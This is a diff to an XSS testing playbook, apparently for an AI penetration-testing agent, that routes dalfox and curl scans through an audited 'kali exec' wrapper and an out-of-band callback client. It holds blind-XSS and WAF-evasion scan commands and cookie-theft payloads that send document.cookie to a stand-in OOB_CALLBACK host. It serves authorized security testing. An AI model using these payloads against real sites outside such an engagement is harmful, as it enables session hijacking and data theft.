@@ -18,10 +18,10 @@ Most XSS findings in 2025 are in client-side rendering contexts (React `dangerou
 
 ## Tools
 
-- `dalfox` — automated reflected XSS scanner: parameter analysis, context detection, WAF fingerprinting, blind XSS via callback
-- `curl` / Burp Suite Repeater — manual request crafting and response analysis
-- Browser DevTools — DOM inspection, source-to-sink tracing, event listener enumeration
-- OOB callback server — blind XSS verification (operator-provisioned, see operator-core Listener & Callback Management)
+- `aith assess kali exec -- dalfox ...` (automated reflected XSS scanner — all target-facing tool invocations must go through the kali exec wrapper; use `--technique XSS --probe-kind payload --phase consume-test --timeout 300`)
+- `aith assess kali exec -- curl ...` (manual request crafting and response analysis — use `--technique XSS --probe-kind payload --phase consume-test --timeout 30`)
+- Browser DevTools — DOM inspection, source-to-sink tracing, event listener enumeration (client-side analysis only)
+- OOB callback client — blind XSS verification: check readiness with `aith oob status --json`; start a named client with `aith oob client start <name> --engagement <key> --agent <agent>`; read correlated hits with `aith oob client logs <name> --lines 80`
 
 ---
 
@@ -47,21 +47,40 @@ Target has query parameters reflecting in HTML?
 
 ## Automated Scanning with dalfox
 
+Run dalfox through the kali exec wrapper so every scan lands in the audit pipeline. Use the unique OOB client URL from `aith oob client start <name>` / `aith oob client logs <name>` for blind XSS callbacks.
+
 ```bash
 # Single URL with parameter
-dalfox url "https://TARGET/search?q=test" --silence
+aith assess kali exec \
+  --technique XSS --intent "dalfox reflected XSS scan on search parameter" \
+  --probe-kind payload --phase consume-test --timeout 300 \
+  -- dalfox url "https://TARGET/search?q=test" --silence
 
 # Pipe discovered URLs (from gau, katana, or param-fuzzing output)
-cat urls_with_params.txt | dalfox pipe --silence
+# Build the URL list host-side first, then pipe via kali exec:
+aith assess kali exec \
+  --technique XSS --intent "dalfox pipe scan on discovered URL set" \
+  --probe-kind payload --phase consume-test --timeout 900 \
+  -- sh -c 'cat /engagements/$ENGAGEMENT_KEY/scans/urls_with_params.txt | dalfox pipe --silence'
 
-# With blind XSS callback (use OOB_CALLBACK_URL from operator dispatch context)
-dalfox url "https://TARGET/search?q=test" --blind "$OOB_CALLBACK_URL"
+# With blind XSS callback (use the unique URL from `aith oob client logs <name>`)
+aith assess kali exec \
+  --technique XSS --intent "dalfox blind XSS scan with OOB callback" \
+  --probe-kind payload --phase consume-test --timeout 300 \
+  -- dalfox url "https://TARGET/search?q=test" --blind "$OOB_CALLBACK_URL"
 
 # JSON output for triage
-dalfox url "https://TARGET/page?param=test" -o /engagements/$ENGAGEMENT_KEY/scans/xss_results.json --format json
+aith assess kali exec \
+  --technique XSS --intent "dalfox XSS scan with JSON output" \
+  --probe-kind payload --phase consume-test --timeout 300 \
+  -- dalfox url "https://TARGET/page?param=test" \
+     -o /engagements/$ENGAGEMENT_KEY/scans/xss_results.json --format json
 
 # WAF fingerprinting (run before payload selection)
-dalfox url "https://TARGET/search?q=test" --waf-evasion
+aith assess kali exec \
+  --technique XSS --intent "dalfox WAF fingerprint before XSS payload selection" \
+  --probe-kind fingerprint --phase consume-test --timeout 120 \
+  -- dalfox url "https://TARGET/search?q=test" --waf-evasion
 ```
 
 dalfox automates context detection, WAF bypass attempts, and payload selection. Use it for initial sweeps, then switch to manual testing for stored XSS, DOM sinks, and framework-specific vectors.
@@ -267,7 +286,7 @@ fetch('https://YOUR_OOB_CALLBACK/hit', {
 ### Operational Notes
 
 - **Timing**: Some blind XSS triggers days or weeks after injection. A support ticket might sit in a queue for a week before an admin opens it. Log viewers might only be checked during incident response. Set callbacks and be patient.
-- **Callback verification**: After injecting, check the named OOB client log periodically (`tail -50 /data/oob/clients/<name>.log` via Kali MCP), or ask the operator for `aith oob client logs <name>`. A hit proves the payload rendered in an internal context.
+- **Callback verification**: After injecting, check shared readiness with `aith oob status --json`, then check the named client periodically with `aith oob client logs <name> --lines 80`. Use `aith logs oob --lines 80` only when debugging raw server/FRP health. A correlated client hit proves the payload rendered in an internal context.
 - **Impact escalation**: A blind XSS in an admin panel is not just "XSS." If the admin panel has: user management (account takeover), payment processing (financial impact), server configuration (RCE chain), or API key management (full compromise) — the XSS inherits that blast radius.
 - **Evidence capture**: The callback payload should exfil enough context to prove impact: the URL where it fired (shows it was admin panel), cookies/tokens (shows session hijack is possible), and a DOM snapshot (shows what the admin sees).
 
@@ -375,13 +394,15 @@ Stored XSS requires a two-phase test: inject, then find every location where the
 
 ## Proof of Concept: Impact Escalation
 
-`alert(1)` proves execution. Engagement reports need impact.
+`alert(1)` proves execution. Engagement reports need impact — you must show the attacker outcome, not just code execution.
+
+Use the unique callback URL from `aith oob client start <name>` / `aith oob client logs <name>` for data exfiltration; check hits with `aith oob client logs <name> --lines 80`.
 
 ```javascript
 // Prove execution context
 alert(document.domain)
 
-// Session hijack — cookie theft
+// Session hijack — cookie theft (use unique OOB URL from aith oob client logs <name>)
 fetch('https://OOB_CALLBACK/steal?c='+document.cookie)
 new Image().src='https://OOB_CALLBACK/steal?c='+document.cookie
 
